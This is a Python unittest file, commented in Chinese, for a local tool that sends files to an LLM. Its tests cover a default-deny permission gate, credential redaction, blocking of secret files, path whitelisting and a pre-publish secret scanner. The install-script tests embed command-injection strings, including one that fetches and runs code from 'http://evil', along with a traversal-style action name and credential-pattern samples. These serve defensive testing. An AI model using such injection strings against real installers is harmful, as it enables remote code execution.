"""通道自检。零第三方依赖，标准库 unittest 即可跑：

    python -m unittest discover -s tests -v

这些用例对应审计报告里的判据，把它们钉死，防止改代码时悄悄退化。
模型层一律 mock，不联网、不消耗额度。
"""
from __future__ import annotations

import contextlib
import importlib.util
import io
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import cli  # noqa: E402
import detector  # noqa: E402
import evidence  # noqa: E402
import install_sendto  # noqa: E402
import model  # noqa: E402
import router  # noqa: E402


def load_scanner():
    """按路径加载发布扫描脚本。它不在包里，不能 import，只能这样取。"""
    spec = importlib.util.spec_from_file_location(
        "pre_publish_scan", ROOT / "scripts" / "pre_publish_scan.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class ChannelTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        os.environ["ARMORY_EVIDENCE_DIR"] = str(Path(cls._tmp.name) / "ev")
        cls.tmp = Path(cls._tmp.name)

        # 测试不能依赖本地 model_config.json —— 它被 gitignore，CI 的干净
        # 克隆上没有，chat() 会在配置检查那步就抛错，根本走不到打桩的 _post。
        # 指向一个死端口，即便打桩漏了也不会真发出请求。
        cls._fake_env = {
            "ARMORY_LLM_BASE_URL": "http://127.0.0.1:9/v1",
            "ARMORY_LLM_API_KEY": "CANARY-FAKE-KEY",
            "ARMORY_LLM_MODEL": "fake-model",
            "ARMORY_LLM_VISION_MODEL": "fake-vision",
        }
        os.environ.update(cls._fake_env)
        model.load_config(force=True)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()
        for key in ("ARMORY_EVIDENCE_DIR", *cls._fake_env):
            os.environ.pop(key, None)
        model.load_config(force=True)

    # ---- 入口健壮性 ----

    def test_empty_paths_is_error_not_crash(self):
        out = router.route("info", [], trusted=True)
        self.assertEqual(out["status"], "error")
        self.assertEqual(out["http"], 400)

    def test_unknown_action_is_400(self):
        self.assertEqual(router.route("nope", [str(ROOT / "cli.py")], trusted=True)["http"], 400)

    def test_unknown_action_writes_no_evidence(self):
        before = len(list(Path(os.environ["ARMORY_EVIDENCE_DIR"]).glob("*.json")))
        router.route("../../evil", [str(ROOT / "cli.py")], trusted=True)
        after = len(list(Path(os.environ["ARMORY_EVIDENCE_DIR"]).glob("*.json")))
        self.assertEqual(before, after, "未知动作不该落证据文件")

    # ---- Permission Gate：默认拒绝，不是黑名单 ----

    def test_high_risk_action_denied(self):
        out = router.route("rename", [str(ROOT / "cli.py")], trusted=True)
        self.assertEqual(out["status"], "denied")
        self.assertEqual(out["http"], 403)

    def test_new_high_risk_action_is_denied_without_being_listed(self):
        """新增一个没写进 prototype_deny 的高危动作，也必须被拦住。"""
        spec = {
            "actions": {
                "nuke": {"label": "删除一切", "kind": "local", "types": ["*"], "risk": "high"},
                "safe": {"label": "安全", "kind": "local", "types": ["*"], "risk": "none"},
            },
            "risk_policy": {"require_confirm": [], "prototype_deny": []},
        }
        self.assertIsNotNone(router._permission_gate("nuke", spec))
        self.assertIsNone(router._permission_gate("safe", spec))

    def test_gate_precedes_extraction(self):
        """被拒绝的动作不该留下对象正文快照。"""
        out = router.route("rename", [str(ROOT / "cli.py")], trusted=True)
        self.assertEqual(out["objects"], [])

    def test_action_table_gate_consistency(self):
        leaks = router.assert_gate_consistency()
        self.assertEqual(leaks, [], f"这些高风险动作没有被拦住：{leaks}")

    # ---- 隐私：证据与预览 ----

    def test_preview_off_by_default(self):
        os.environ.pop("ARMORY_CAPTURE_PREVIEW", None)
        ctx = detector.extract(str(ROOT / "README.md"))
        self.assertNotIn("preview", ctx)

    def test_sensitive_file_never_gets_preview(self):
        os.environ["ARMORY_CAPTURE_PREVIEW"] = "1"
        try:
            ctx = detector.extract(str(ROOT / "model_config.json"))
            self.assertNotIn("preview", ctx,
                             "配置文件即便开了预览也不许抽正文")
        finally:
            os.environ.pop("ARMORY_CAPTURE_PREVIEW", None)

    def test_secret_shaped_text_is_redacted(self):
        os.environ["ARMORY_CAPTURE_PREVIEW"] = "1"
        try:
            p = self.tmp / "sample.txt"
            p.write_text("api_key = nvapi-SECRETVALUE123456\nnormal line\n", encoding="utf-8")
            ctx = detector.extract(str(p))
            preview = ctx.get("preview", "")
            self.assertNotIn("nvapi-SECRETVALUE123456", preview)
            self.assertIn("[REDACTED]", preview)
        finally:
            os.environ.pop("ARMORY_CAPTURE_PREVIEW", None)

    # ---- 诚实性 ----

    def test_clipboard_failure_returns_false(self):
        with mock.patch.object(cli.subprocess, "run",
                               return_value=mock.Mock(returncode=1, stderr="boom")):
            self.assertFalse(cli.set_clipboard("hello"))

    def test_clipboard_success_returns_true(self):
        with mock.patch.object(cli.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stderr="")):
            self.assertTrue(cli.set_clipboard("hello"))

    def test_binary_is_not_sent_to_model(self):
        p = self.tmp / "fake.pdf"
        p.write_bytes(b"\x00\x01\x02" + b"x" * 500)
        ctx = detector.extract(str(p))
        self.assertEqual(ctx["type"], "document", "伪装成 pdf 确实会被判成文档")
        with mock.patch("model.chat", side_effect=AssertionError("不该调到模型")):
            out = router.route("summarize", [str(p)], trusted=True)
        self.assertNotEqual(out["result"].get("status"), "ok")
        self.assertIn("不是纯文本", out["result"].get("message", ""))

    # ---- HTTP 总线：默认不可用 ----

    def test_untrusted_route_denied_without_whitelist(self):
        os.environ.pop("ARMORY_ALLOWED_ROOTS", None)
        out = router.route("info", [str(ROOT / "cli.py")], trusted=False)
        self.assertEqual(out["status"], "denied")
        self.assertEqual(out["http"], 403)

    def test_untrusted_route_respects_whitelist(self):
        os.environ["ARMORY_ALLOWED_ROOTS"] = str(ROOT)
        try:
            out = router.route("info", [str(ROOT / "cli.py")], trusted=False)
            self.assertNotEqual(out["status"], "denied")
        finally:
            os.environ.pop("ARMORY_ALLOWED_ROOTS", None)

    def test_untrusted_route_rejects_outside_path(self):
        os.environ["ARMORY_ALLOWED_ROOTS"] = str(ROOT)
        try:
            outside = self.tmp / "outside.txt"
            outside.write_text("secret", encoding="utf-8")
            out = router.route("info", [str(outside)], trusted=False)
            self.assertEqual(out["status"], "denied")
        finally:
            os.environ.pop("ARMORY_ALLOWED_ROOTS", None)

    def test_serve_refuses_without_whitelist(self):
        os.environ.pop("ARMORY_ALLOWED_ROOTS", None)
        with self.assertRaises(SystemExit):
            router.serve(port=0)

    # ---- 外发路径的凭据防护（第 2 轮审计新增 P0） ----

    def test_sensitive_config_is_never_sent_to_model(self):
        """右键「总结」自己的 model_config.json：必须拒绝，不能发出去。

        自己造一个同名文件：仓库里那个被 gitignore，干净克隆上不存在。
        """
        p = self.tmp / "model_config.json"
        p.write_text('{"api_key": "CANARY-FAKE"}', encoding="utf-8")
        with mock.patch.object(model, "_post",
                               side_effect=AssertionError("凭据文件不该被发出")):
            out = router.route("summarize", [str(p)], trusted=True)
        self.assertNotEqual(out["result"].get("status"), "ok")
        self.assertIn("拒绝发送", out["result"].get("message", ""))

    def test_keyfile_is_never_sent_to_model(self):
        """key.txt 只有 1.3KB，体积闸门拦不住，只能靠文件名判据。"""
        p = self.tmp / "key.txt"
        p.write_text("nvapi-FAKE1\nnvapi-FAKE2\n", encoding="utf-8")
        with mock.patch.object(model, "_post",
                               side_effect=AssertionError("key 文件不该被发出")):
            out = router.route("translate", [str(p)], trusted=True)
        self.assertNotEqual(out["result"].get("status"), "ok")
        self.assertIn("拒绝发送", out["result"].get("message", ""))

    def test_secrets_in_body_are_redacted_before_send(self):
        """非敏感文件名，内容里夹着凭据也要抹掉再发。"""
        import json
        p = self.tmp / "notes.txt"
        p.write_text("api_key = nvapi-REALKEY1234567\nordinary line\n", encoding="utf-8")

        captured = {}

        def fake_post(cfg, payload):
            captured.update(payload)
            return {"choices": [{"message": {"content": "done"}}]}

        with mock.patch.object(model, "_post", fake_post):
            out = router.route("summarize", [str(p)], trusted=True)

        body = json.dumps(captured, ensure_ascii=False)
        self.assertNotIn("nvapi-REALKEY1234567", body, "明文凭据进了请求体")
        self.assertIn("[REDACTED]", body)
        self.assertEqual(out["result"]["data"].get("redacted"), 1)

    # ---- Permission Gate：默认拒绝要覆盖「没写 risk 键」的情况 ----

    def test_action_without_risk_field_is_denied(self):
        spec = {"actions": {
            "whatever": {"label": "随便", "kind": "local", "types": ["*"]}},
            "risk_policy": {}}
        self.assertIsNotNone(router._permission_gate("whatever", spec),
                             "没声明 risk 的动作必须被拦，否则'默认拒绝'名不副实")

    def test_action_without_kind_field_is_denied(self):
        spec = {"actions": {
            "whatever": {"label": "随便", "types": ["*"], "risk": "none"}},
            "risk_policy": {}}
        self.assertIsNotNone(router._permission_gate("whatever", spec))

    # ---- 安装脚本：配置数据的注入面 ----

    def test_install_rejects_unsafe_action_key(self):
        with self.assertRaises(SystemExit):
            install_sendto._check_action('x$(Invoke-Expression(iwr http://evil))')
        self.assertEqual(install_sendto._check_action("summarize"), "summarize")

    def test_install_rejects_unsafe_label(self):
        with self.assertRaises(SystemExit):
            install_sendto._check_label("'; Invoke-Expression(1); #")

    # ---- 证据落点 ----

    def test_evidence_never_falls_back_into_repo(self):
        env = {k: v for k, v in os.environ.items()
               if k not in ("LOCALAPPDATA", "ARMORY_EVIDENCE_DIR")}
        with mock.patch.dict(os.environ, env, clear=True):
            d = evidence.default_dir()
        self.assertNotIn(str(ROOT), str(d),
                         "LOCALAPPDATA 缺失时也不许回落到仓库目录")

    def test_gitignore_covers_evidence(self):
        text = (ROOT / ".gitignore").read_text(encoding="utf-8")
        self.assertIn("evidence/", text)
        self.assertNotIn("evidencetmp/", text, "死规则该删掉了")

    # ---- 图片外发（第 3 轮 M-1）：图片无法脱敏，闸门比文本路更关键 ----

    def test_sensitive_image_is_never_sent_to_vision_model(self):
        """一张叫 key.png 的图，不能整张上传给视觉模型。"""
        p = self.tmp / "key.png"
        p.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 40)  # 够过 PNG 头校验
        with mock.patch.object(model, "_post",
                               side_effect=AssertionError("敏感图片不该被上传")):
            out = router.route("describe", [str(p)], trusted=True)
        self.assertNotEqual(out["result"].get("status"), "ok")
        self.assertIn("拒绝发送", out["result"].get("message", ""))

    # ---- 脱敏召回（第 3 轮 M-2）：常见凭据类型不能漏 ----

    def test_redact_covers_common_credential_shapes(self):
        cases = {
            "AKIA": "aws = AKIAIOSFODNN7EXAMPLE",
            "github": "tok = ghp_16C7e42F8b0a4e1f9c3d5a7b6e8f0a1c2d3e4f5a",
            "jwt": "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc123",
            "conn": "db = mysql://root:Tr0ub4dor3@10.0.0.5/prod",
            "slack": "bot = xoxb-123456789012-1234567890123-AbCdEfGhIjKlMnOpQrStUvWx",
            "google": "gkey = AIzaSyD-1234567890abcdefghijklmnopqrstu",
        }
        for name, line in cases.items():
            red, n = detector.redact(line)
            self.assertGreater(n, 0, f"{name} 型凭据没被识别：{line}")
            self.assertIn("[REDACTED]", red)

    # ---- 误拒（第 3 轮 M-3）：正常文件不该被当成凭据挡掉 ----

    def test_normal_files_are_not_mistaken_for_secrets(self):
        """子串匹配曾把 monkey.md、token-usage.csv 全拒了，误拒比漏放更伤信任。"""
        for name in ("turkey.txt", "monkey.md", "token-usage.csv", "keyword_research.md"):
            self.assertIsNone(detector.sensitive_reason(name),
                              f"{name} 不该被判为敏感文件")

    def test_real_secret_names_are_still_caught(self):
        for name in ("key.txt", "api_keys.json", "secrets.yaml",
                     "id_rsa", "server.pem", "harbor_config.json", ".env.local"):
            self.assertIsNotNone(detector.sensitive_reason(name),
                                 f"{name} 必须被判为敏感文件")

    def test_denial_says_which_rule_matched(self):
        """拒绝话术要说出命中了哪条，否则用户只能猜怎么绕过。"""
        reason = detector.sensitive_reason("api_keys.json")
        self.assertIsInstance(reason, str)
        self.assertTrue(len(reason) > 0)

    # ---- trusted 必填（第 3 轮 N-5）----

    def test_route_requires_explicit_trusted(self):
        with self.assertRaises(TypeError):
            router.route("info", [str(ROOT / "cli.py")])

    def test_token_file_is_generated_once(self):
        with mock.patch.object(router, "TOKEN_FILE", self.tmp / "token"):
            t1 = router.ensure_token()
            t2 = router.ensure_token()
            self.assertEqual(t1, t2)
            self.assertGreaterEqual(len(t1), 32)


class Round4Test(unittest.TestCase):
    """第 4 轮审计的 6 条 P2。都是精修级，但每条都有一个真实事故在背后。"""
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.tmp = Path(cls._tmp.name)
        os.environ["ARMORY_LLM_BASE_URL"] = "http://127.0.0.1:9/v1"
        os.environ["ARMORY_LLM_API_KEY"] = "CANARY-FAKE-KEY"
        os.environ["ARMORY_LLM_MODEL"] = "fake-model"
        model.load_config(force=True)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()
        for k in ("ARMORY_LLM_BASE_URL", "ARMORY_LLM_API_KEY", "ARMORY_LLM_MODEL"):
            os.environ.pop(k, None)
        model.load_config(force=True)

    # ---- M-9：现代 ssh 私钥名 ----

    def test_modern_ssh_key_names_are_sensitive(self):
        """名单曾只有 ^id_rsa，id_ed25519 靠内容层兜住——兜得住是运气，不是设计。"""
        for name in ("id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_ed448"):
            self.assertIsNotNone(detector.sensitive_reason(name), f"{name} 该被判敏感")

    # ---- M-10：父目录名参与判定 ----

    def test_parent_dir_name_is_checked(self):
        """`…\\password\\notes.txt` 这种「目录说明一切」的文件不该放行。"""
        self.assertIsNotNone(detector.sensitive_reason(str(Path("password") / "notes.txt")))
        self.assertIsNotNone(detector.sensitive_reason(str(Path("id_ed25519") / "notes.txt")))

    def test_parent_dir_check_is_one_level_only(self):
        """只查一层。逐级向上会把 `…\\keys\\` 之下的所有东西全拒，误报不可控。"""
        self.assertIsNone(detector.sensitive_reason(str(Path("keys") / "deep" / "notes.txt")))

    # ---- M-2 余项：像 .env 却一条都没抹掉 ----

    def test_env_shaped_content_without_hits_is_flagged(self):
        """无标签的随机值正则无从判定，那就如实说「可能没覆盖」，别假装干净。"""
        text = "db_host = 10.0.0.5\ndb_user = armory_admin\nendpoint = https://x.example\n"
        self.assertEqual(detector.redact(text)[1], 0, "这三行本就不该被识别成凭据")
        self.assertIn("KEY=VALUE", detector.env_shape_hint(text, 0))
        self.assertEqual(detector.env_shape_hint(text, 1), "", "抹掉过就不必再提示")
        self.assertEqual(detector.env_shape_hint("就是一段普通文字\n", 0), "")

    # ---- M-8：外发之前要让用户看见 ----

    def test_egress_notice_names_file_size_and_host(self):
        p = self.tmp / "notes.txt"
        p.write_text("x" * 2048, encoding="utf-8")
        note = cli._egress_notice([str(p)])
        self.assertIn("即将上传", note)
        self.assertIn("notes.txt", note)
        self.assertIn("2.0 KB", note)
        self.assertIn("127.0.0.1", note, "发给谁必须写出来")

    def test_egress_action_notifies_before_running(self):
        p = self.tmp / "notes.txt"
        p.write_text("hello", encoding="utf-8")
        calls: list[str] = []
        with mock.patch.object(cli, "notify", lambda _t, x: calls.append(x)), \
             mock.patch.object(router, "route",
                               lambda *a, **k: {"status": "ok",
                                               "result": {"message": "done"},
                                               "evidence": {}}):
            cli.main(["cli", "summarize", str(p)])
        self.assertTrue(calls)
        self.assertIn("即将上传", calls[0], "外发动作第一条通知必须是「要发什么发给谁」")

    # ---- M-4 漏项：文件夹也该有回执 ----

    def test_folder_action_gets_progress_notice(self):
        """判定曾写 os.path.isfile，于是大目录跑 index 永远拿不到回执。"""
        small = self.tmp / "small_dir"
        small.mkdir()
        (small / "a.txt").write_text("x", encoding="utf-8")
        self.assertFalse(cli._is_slow([str(small)]), "小目录不必打扰用户")

        big = self.tmp / "big_dir"
        big.mkdir()
        for i in range(8):
            (big / f"f{i}.txt").write_text("", encoding="utf-8")
        with mock.patch.object(cli, "SLOW_DIR_ENTRIES", 5):
            self.assertTrue(cli._is_slow([str(big)]), "大目录遍历最像卡死，必须发回执")

    # ---- M-11：发布扫描不许把真凭据回显到 stdout ----

    def test_scanner_masks_credential_hits(self):
        pps = load_scanner()
        self.assertEqual(pps.MASKED_KINDS, {"真实凭据形状"})
        self.assertNotIn("QWERTYUIOPASDFGHJKLZXCVBNM1234",
                         pps._mask("nvapi-QWERTYUIOPASDFGHJKLZXCVBNM1234"))

    def test_scanner_never_echoes_secret_to_stdout(self):
        pps = load_scanner()
        secret = "nvapi-QWERTYUIOPASDFGHJKLZXCVBNM1234"
        (self.tmp / "leak.md").write_text(f"key = {secret}\n", encoding="utf-8")
        pps.ROOT, pps.tracked_files = self.tmp, lambda: (["leak.md"], True)

        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = pps.main()
        self.assertEqual(rc, 1)
        self.assertIn("leak.md", buf.getvalue(), "定位信息要留")
        self.assertNotIn(secret, buf.getvalue(), "真凭据不许进终端回滚缓冲")

    # ---- M-12：hash 规则要双向 ----

    def test_scanner_catches_hash_before_or_after_keyword(self):
        """前瞻只覆盖 hash 在关键词之前，中文语序里关键词在前才是常态。"""
        pps = load_scanner()
        (self.tmp / "doc.md").write_text("上一轮审计的提交号 6203c0d5 已被替换\n",
                                         encoding="utf-8")
        (self.tmp / "clean.md").write_text("这是一行普通文字，没有十六进制串\n",
                                           encoding="utf-8")
        pps.ROOT, pps.tracked_files = self.tmp, lambda: (["doc.md", "clean.md"], True)

        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = pps.main()
        self.assertEqual(rc, 1, "关键词在 hash 之前的写法也要抓到")
        self.assertIn("内部提交 hash", buf.getvalue())
        self.assertNotIn("clean.md", buf.getvalue(), "别把普通文字当提交号")

    # ---- M-13：整改指引要说对场景 ----

    def test_scanner_guidance_matches_scenario(self):
        """无 git 的解包目录里给「git rm --cached」，等于给了一句废话。"""
        pps = load_scanner()
        (self.tmp / "model_config.json").write_text('{"api_key": "x"}', encoding="utf-8")
        pps.ROOT = self.tmp

        pps.tracked_files = lambda: (["model_config.json"], False)
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            pps.main()
        self.assertNotIn("git rm --cached", buf.getvalue(), "没有 git 就不该给 git 指令")
        self.assertIn("删掉", buf.getvalue())

        pps.tracked_files = lambda: (["model_config.json"], True)
        buf2 = io.StringIO()
        with contextlib.redirect_stdout(buf2):
            pps.main()
        self.assertIn("git rm --cached", buf2.getvalue())


if __name__ == "__main__":
    unittest.main(verbosity=2)
